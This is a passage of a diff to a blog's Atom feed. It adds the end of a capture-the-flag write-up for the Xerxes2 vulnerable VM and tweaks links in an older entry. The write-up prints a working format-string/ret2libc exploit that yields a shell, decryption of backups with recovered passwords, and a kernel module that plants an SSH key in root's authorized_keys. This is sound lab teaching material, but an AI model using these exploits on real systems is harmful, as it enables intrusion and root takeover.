+<p>(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8184u%16$n&rdquo; + &ldquo;%8198u%17$n&rdquo;)])&rsquo;)#&ldquo;
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y</p>
+
+<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8184u%16$n&rdquo; + &ldquo;%8198u%17$n&rdquo;)])&rsquo;)#&ldquo;
+H�J�                                                                                                                                                                                                             <br/>
+Breakpoint 1, 0x080486eb in main ()
+(gdb) x/x 0x08049a48
+0x8049a48 <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x70;&#114;&#105;&#x6e;&#x74;&#102;&#x40;&#x67;&#x6f;&#x74;&#x2e;&#x70;&#x6c;&#116;">&#x70;&#114;&#x69;&#110;&#x74;&#102;&#x40;&#x67;&#x6f;&#x74;&#46;&#112;&#x6c;&#116;</a>: 0x40062000
+(gdb)
+```</p>
+
+<p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>
+
+<h3>/opt/bf &ndash; part5</h3>
+
+<p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>
+
+<p><code>bash Exploiting bf
+delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("\x48\x9a\x04\x08" + "\x4a\x9a\x04\x08" + "%8184u%16$n" + "%8198u%17$n" + ";/bin/sh")])')##"
+H�J�                                                                                                                                                                                                              d
+$ id
+uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
+$
+</code></p>
+
+<p>Oly. Crap. That. Was. Awesome. :D :D</p>
+
+<p>We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.</p>
+
+<h2>becoming korenchkin</h2>
+
+<p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>
+
+<p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>
+
+<p><code>bash polito home
+polito@xerxes2:~$ ls -lh
+total 43M
+-rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt
+-rw-r--r-- 1 polito polito  43M Jul 16 12:17 dump.gpg
+-rw-r--r-- 1 polito polito  27K Jul 16 12:19 polito.pdf
+polito@xerxes2:~$ crontab -l
+[...]
+@reboot while true ; do nc -l -p 4444 &lt; /home/polito/audio.txt ; done
+polito@xerxes2:~$
+</code></p>
+
+<p>There was not much I could do with the <code>dump.gpg</code> yet, so I decided to open up the pdf in a pdf viewer:</p>
+
+<p><img class="<a" src="href="https://i.imgur.com/WMuVK8O.png">https://i.imgur.com/WMuVK8O.png</a>"></p>
+
+<p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&hellip;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>
+
+<p><code>bash polito.pdf File
+polito@xerxes2:~$ file -k polito.pdf
+polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)
+</code></p>
+
+<p>&hellip;<em>x86 boot sector</em>&hellip; wait&hellip; <strong>WHAT</strong>?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:</p>
+
+<p><code>bash polito.pdf headers
+00000000  83 E0 FF EB  1F 25 50 44   46 2D 31 2E  35 0A 39 39 .....%PDF-1.5.99
+00000010  39 20 30 20  6F 62 6A 0A   3C 3C 3E 3E  0A 73 74 72 9 0 obj.&lt;&lt;&gt;&gt;.str
+00000020  65 61 6D 0A  68 E0 08 17   BC 00 10 68  C0 07 1F EB eam.h......h....
+00000030  21 59 81 F9  4D 5A 74 0C   B4 0E 86 C1  CD 10 86 C5 !Y..MZt.........
+00000040  CD 10 EB ED  BE 55 00 AC   75 02 EB FE  B4 0E CD 10 .....U..u.......
+00000050  EB F5 EB 72  E9 2D 2D 57   41 52 4E 49  4E 47 2D 2D ...r.--WARNING--
+00000060  0A 20 20 20  55 6E 61 75   74 68 6F 72  69 7A 65 64 .   Unauthorized
+00000070  20 66 69 6C  65 20 61 63   63 65 73 73  20 77 69 6C file access wil
+00000080  6C 20 62 65  20 72 65 70   6F 72 74 65  64 2E 0A 20 l be reported..
+00000090  20 20 20 20  58 45 52 58   45 53 20 77  69 73 68 65 XERXES wishe
+000000A0  73 20 79 6F  75 0A 20 20   20 20 20 20  20 20 20 20 s you.
+000000B0  61 20 6D 6F  73 74 20 70   72 6F 64 75  63 74 69 76 a most productiv
+000000C0  65 20 64 61  79 00 68 6F   77 68 59 58  68 0D 0A 68 e day.howhYXh..h
+000000D0  37 69 68 68  7A 68 4F 77   68 34 35 68  0A 40 68 67 7ihhzhOwh45h.@hg
+000000E0  49 68 20 2C  68 23 6F 68   4D 5A 68 0A  0A 68 4E 6C Ih ,h#ohMZh..hNl
+000000F0  68 61 57 68  46 75 68 61   6D 68 0A 20  68 3A 20 68 haWhFuhamh. h: h
+00000100  69 73 68 64  20 68 6F 72   68 73 77 68  61 73 68 20 ishd horhswhash
+00000110  70 68 68 65  68 0A 54 E9   17 FF 00 00  00 00 00 00 phheh.T.........
+00000120  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+00000130  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+00000140  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+00000150  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+00000160  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+00000170  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+00000180  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+00000190  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+000001A0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+000001B0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+000001C0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+000001D0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+000001E0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+000001F0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 55 AA ..............U.
+00000200  25 50 44 46  2D 31 2E 35   0A 25 D0 D4  C5 D8 0A 34 %PDF-1.5.%.....4
+</code></p>
+
+<p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>
+
+<p>```bash
+root@kali:~# head -c 512 polito.pdf > first
+root@kali:~# file -k first
+first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)</p>
+
+<p>root@kali:~# tail -c +512 polito.pdf > second
+root@kali:~# file second
+second: Dyalog APL
+root@kali:~#
+```</p>
+
+<p>Opening <code>first</code> in a PDF viewer gave a blank PDF, and <code>second</code> gave the PDF we saw originally with <code>polito.pdf</code>. <code>first</code> was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the <a href="http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout">structure</a> etc. Eventually it was time to take a break and come back with a fresh look at this.</p>
+
+<p>I came back with some new ideas. One of them being that I should quickly create a VM, attach <code>first</code> as a disk and try run it and see what the output would be. VirtualBox did not like the file format of <code>first</code> :( Next I resorted to using <code>qemu</code>. And success!</p>
+
+<p><img class="<a" src="href="https://i.imgur.com/1HFOfwc.png">https://i.imgur.com/1HFOfwc.png</a>"></p>
+
+<p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>
+
+<p>```bash GPG decrypt
+polito@xerxes2:~$ gpg -d dump.gpg > decrypted_dump
+gpg: CAST5 encrypted data
+gpg: encrypted with 1 passphrase
+gpg: WARNING: message was not integrity protected</p>
+
+<p>polito@xerxes2:~$ file decrypted_dump
+decrypted_dump: data</p>
+
+<p>polito@xerxes2:~$ ls -lh decrypted_dump
+-rw-r&mdash;r&mdash; 1 polito polito 126M Aug 10 02:12 decrypted_dump
+```</p>
+
+<p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>
+
+<p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>
+
+<p><code>bash Finding korenchkin.tar.enc password
+polito@xerxes2:~$ grep $(ls /opt/backup/) decrypted_strings
+korenchkin.tar.enc
+openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
+openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
+openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
+polito@xerxes2:~$
+</code></p>
+
+<p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>
+
+<p>```bash decrypting korenchkin.tar.enc
+polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar</p>
+
+<p>polito@xerxes2:~$ file korenchkin.tar
+korenchkin.tar: POSIX tar archive (GNU)</p>
+
+<p>polito@xerxes2:~$ tar xvf korenchkin.tar
+.ssh/id_rsa
+.ssh/id_rsa.pub
+polito@xerxes2:~$
+```</p>
+
+<p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>
+
+<p>```bash SSH as korenchkin
+root@kali:~# ssh -i korenchkin.key <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#107;&#x6f;&#114;&#x65;&#110;&#99;&#104;&#x6b;&#x69;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#x35;&#x36;&#x2e;&#49;&#48;&#50;">&#x6b;&#x6f;&#114;&#101;&#110;&#x63;&#104;&#x6b;&#105;&#x6e;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x35;&#x36;&#x2e;&#x31;&#x30;&#50;</a></p>
+
+<p>Welcome to xerxes2.</p>
+
+<pre><code>  XERXES wishes you
+   a pleasant stay.
+</code></pre>
+
+<hr />
+
+<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
+</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
+ </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
+  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
+   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
+  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
+<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>
+
+<p>You have new mail.
+korenchkin@xerxes2:~$
+```</p>
+
+<p><em>You have new mail.</em></p>
+
+<h2>becoming root</h2>
+
+<p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>
+
+<p>```bash korenchkin sudo
+korenchkin@xerxes2:~$ sudo -l
+Matching Defaults entries for korenchkin on this host:</p>
+
+<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</code></pre>
+
+<p>User korenchkin may run the following commands on this host:</p>
+
+<pre><code>(root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
+</code></pre>
+
+<p>```</p>
+
+<p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>
+
+<p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>
+
+<p>```c hello.c</p>
+
+<h1>include &lt;linux/module.h>       /<em> Needed by all modules </em>/</h1>
+
+<h1>include &lt;linux/kernel.h>       /<em> Needed for KERN_INFO </em>/</h1>
+
+<h1>include &lt;linux/init.h>         /<em> Needed for the macros </em>/</h1>
+
+<p>static int __init hello_start(void)
+{</p>
+
+<pre><code>printk(KERN_INFO "Loading hello module...\n");
+return 0;
+</code></pre>
+
+<p>}</p>
+
+<p>static void __exit hello_end(void)
+{</p>
+
+<pre><code>printk(KERN_INFO "Goodbye Mr.\n");
+</code></pre>
+
+<p>}</p>
+
+<p>module_init(hello_start);
+module_exit(hello_end);
+```</p>
+
+<p>```make hello Makefile
+obj-m += hello.o</p>
+
+<p>all:</p>
+
+<pre><code>make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+</code></pre>
+
+<p>clean:</p>
+
+<pre><code>make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+</code></pre>
+
+<p>```</p>
+
+<p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>
+
+<p><code>``bash hello kernel module testing
+korenchkin@xerxes2:~/kern$ make
+make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
+make[1]: Entering directory</code>/usr/src/linux-headers-3.2.0-4-686-pae'
+  CC [M]  /home/korenchkin/kern/hello.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/korenchkin/kern/hello.mod.o
+  LD [M]  /home/korenchkin/kern/hello.ko
+make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'</p>
+
+<p>korenchkin@xerxes2:~/kern$ sudo insmod hello.ko</p>
+
+<p>korenchkin@xerxes2:~/kern$ dmesg | tail
+[&hellip;]
+[68192.983366] hello: module license &lsquo;unspecified&rsquo; taints kernel.
+[68192.983369] Disabling lock debugging due to kernel taint
+[68192.983637] Loading hello module&hellip;
+korenchkin@xerxes2:~/kern$
+```</p>
+
+<p>Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? <code>#include &lt;stdio.h&gt;</code>, and <code>system()</code> some commands to run <code>stuff</code>, getting me a <code>/tmp/getroot</code> prepared.</p>
+
+<p><em>insert loud crash and burn sound here</em></p>
+
+<p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>
+
+<p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href="http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage">this</a> amongst other pieces of information helped get the ball rolling.</p>
+
+<p>```bash Rewritten hello.c to rooted.c</p>
+
+<h1>include &lt;linux/module.h>       /<em> Needed by all modules </em>/</h1>
+
+<h1>include &lt;linux/kernel.h>       /<em> Needed for KERN_INFO </em>/</h1>
+
+<h1>include &lt;linux/init.h>         /<em> Needed for the macros </em>/</h1>
+
+<p>/<em> For our shell ^_^ </em>/</p>
+
+<h1>include&lt;linux/kmod.h></h1>
+
+<p>int get_root (void)
+{</p>
+
+<pre><code>char * envp[] = { "HOME=/", NULL };
+char *argv[] = { "/bin/bash", "-c", "/bin/cat /tmp/pubkey &gt;&gt; /root/.ssh/authorized_keys", NULL};
+printk(KERN_INFO "Call Usermodehelper...\n");
+call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+printk(KERN_INFO "Done usermodehelper...\n");
+return 0;
+</code></pre>
+
+<p>}</p>
+
+<p>static int __init hello_start(void)
+{</p>
+
+<pre><code>printk(KERN_INFO "Loading rooted module...\n");
+return get_root();
+return 0;
+</code></pre>
+
+<p>}</p>
+
+<p>static void __exit hello_end(void)
+{</p>
+
+<pre><code>printk(KERN_INFO "Goodbye Mr.\n");
+</code></pre>
+
+<p>}</p>
+
+<p>module_init(hello_start);
+module_exit(hello_end);
+```</p>
+
+<p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>
+
+<p>```bash Xerxes2 rooting
+korenchkin@xerxes2:~/kern$ vi rooted.c</p>
+
+<p>korenchkin@xerxes2:~/kern$ vi Makefile</p>
+
+<p>korenchkin@xerxes2:~/kern$ make
+make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
+make[1]: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
+  CC [M]  /home/korenchkin/kern/rooted.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/korenchkin/kern/rooted.mod.o
+  LD [M]  /home/korenchkin/kern/rooted.ko
+make[1]: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae'</p>
+
+<p>korenchkin@xerxes2:~/kern$ echo &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&rdquo; > /tmp/pubkey</p>
+
+<p>korenchkin@xerxes2:~/kern$ sudo insmod rooted.ko</p>
+
+<p>korenchkin@xerxes2:~/kern$ dmesg | tail
+[   14.512040] eth0: no IPv6 routers present
+[  290.023022] Clocksource tsc unstable (delta = 4686567555 ns)
+[  290.025022] Switching to clocksource acpi_pm
+[57198.109946] bf[25367]: segfault at 40062000 ip 40062000 sp bfc6282c error 14
+[68192.983366] hello: module license &lsquo;unspecified&rsquo; taints kernel.
+[68192.983369] Disabling lock debugging due to kernel taint
+[68192.983637] Loading hello module&hellip;
+[74155.086393] Loading rooted module&hellip;
+[74155.086397] Call Usermodehelper&hellip;
+[74155.086449] Done usermodehelper&hellip;</p>
+
+<p>korenchkin@xerxes2:~/kern$ logout
+Connection to 192.168.56.102 closed.</p>
+
+<p>root@kali:~/Desktop/xeres2# ssh <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#53;&#54;&#46;&#x31;&#x30;&#x32;">&#x72;&#111;&#111;&#116;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#53;&#x36;&#46;&#x31;&#48;&#50;</a> -i delacroix</p>
+
+<p>Welcome to xerxes2.</p>
+
+<pre><code>  XERXES wishes you
+   a pleasant stay.
+</code></pre>
+
+<hr />
+
+<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
+</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
+ </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
+  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
+   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
+  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
+<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>
+
+<p>root@xerxes2:~# id
+uid=0(root) gid=0(root) groups=0(root)</p>
+
+<p>root@xerxes2:~# cat /root/flag.txt</p>
+
+<hr />
+
+<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
+</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
+ </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
+  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
+   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
+  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
+<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>
+
+<pre><code>congratulations on beating xerxes2!
+
+I hope you enjoyed it as much as I did making xerxes2. 
+xerxes1 has been described as 'weird' and 'left-field'
+and I hope that this one fits that description too :)
+
+Many thanks to @TheColonial &amp; @rasta_mouse for testing!
+
+Ping me on #vulnhub for thoughts and comments!
+
+                  @barrebas, July 2014
+</code></pre>
+
+<p>root@xerxes2:~#
+```</p>
+
+<h2>conclusion</h2>
+
+<p>Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks <a href="https://twitter.com/barrebas">@barrebas</a> and <a href="https://twitter.com/VulnHub">@VulnHub</a> for another great learning opportunity.</p>
+
+<p>Now, the next step? OSCP :)</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Flick - Can You Find the Flag?]]></title>
@@ -653,8 +1563,8 @@ mysql_connect("127.0.0.1", "www-data", "website") or die("Server Error");
 <p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>
 
 <p>```bash ssh as jack
-root@kali:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x6a;&#97;&#99;&#x6b;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#50;">&#x6a;&#x61;&#99;&#x6b;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x35;&#x36;&#x2e;&#49;&#48;&#x32;</a>
-<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x6a;&#x61;&#99;&#107;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x35;&#x36;&#46;&#49;&#x30;&#x32;">&#x6a;&#97;&#x63;&#x6b;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#53;&#x36;&#46;&#x31;&#48;&#x32;</a>&rsquo;s password:
+root@kali:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#106;&#x61;&#x63;&#x6b;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#53;&#54;&#46;&#49;&#48;&#50;">&#x6a;&#97;&#99;&#107;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#53;&#x36;&#46;&#49;&#48;&#x32;</a>
+<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x6a;&#97;&#x63;&#107;&#64;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x35;&#54;&#x2e;&#x31;&#48;&#x32;">&#106;&#97;&#x63;&#107;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x35;&#54;&#46;&#x31;&#48;&#50;</a>&rsquo;s password:
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -827,7 +1737,7 @@ gpg:   secret keys imported: 1
 $ gpg /var/mail/jack/received/message.eml</p>
 
 <p>You need a passphrase to unlock the secret key for
-user: &ldquo;<a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#106;&#x61;&#99;&#x6b;&#x40;&#99;&#x6f;&#119;&#x6c;&#111;&#x76;&#x65;&#x72;&#x73;&#46;&#99;&#111;&#109;">&#106;&#x61;&#99;&#x6b;&#x40;&#x63;&#111;&#119;&#x6c;&#x6f;&#118;&#101;&#x72;&#115;&#x2e;&#x63;&#111;&#109;</a>&rdquo;</p>
+user: &ldquo;<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#x61;&#x63;&#x6b;&#64;&#x63;&#111;&#119;&#108;&#111;&#118;&#x65;&#x72;&#x73;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#97;&#x63;&#107;&#64;&#99;&#111;&#x77;&#108;&#x6f;&#118;&#101;&#x72;&#x73;&#46;&#99;&#x6f;&#109;</a>&rdquo;</p>
 
 <h1>used the password g0tmi1k69 found in the MySQL database</h1>
 
@@ -852,8 +1762,8 @@ Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your re
 <p>So, lets ssh in as <code>milk_4_life</code>&hellip;</p>
 
 <p>```bash SSH as milk_4_life
-root@kali:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x6d;&#x69;&#x6c;&#x6b;&#x5f;&#x34;&#x5f;&#108;&#105;&#102;&#x65;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#53;&#54;&#46;&#49;&#48;&#50;">&#x6d;&#x69;&#108;&#x6b;&#x5f;&#x34;&#95;&#108;&#105;&#x66;&#101;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#53;&#x36;&#46;&#x31;&#x30;&#50;</a>
-<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#109;&#105;&#108;&#x6b;&#95;&#x34;&#x5f;&#108;&#x69;&#102;&#x65;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#56;&#46;&#x35;&#54;&#46;&#x31;&#48;&#50;">&#109;&#105;&#108;&#x6b;&#x5f;&#52;&#x5f;&#x6c;&#x69;&#x66;&#101;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x35;&#x36;&#x2e;&#49;&#x30;&#50;</a>&rsquo;s password:
+root@kali:~# ssh <a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#109;&#105;&#108;&#107;&#95;&#52;&#x5f;&#108;&#x69;&#x66;&#101;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#53;&#x36;&#x2e;&#49;&#x30;&#50;">&#x6d;&#x69;&#x6c;&#107;&#95;&#x34;&#95;&#x6c;&#x69;&#102;&#x65;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x35;&#x36;&#x2e;&#49;&#x30;&#x32;</a>
+<a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6d;&#x69;&#x6c;&#107;&#x5f;&#52;&#x5f;&#x6c;&#x69;&#x66;&#x65;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#53;&#x36;&#46;&#49;&#48;&#50;">&#109;&#x69;&#108;&#x6b;&#95;&#x34;&#95;&#x6c;&#x69;&#x66;&#x65;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x35;&#54;&#46;&#49;&#x30;&#50;</a>&rsquo;s password:
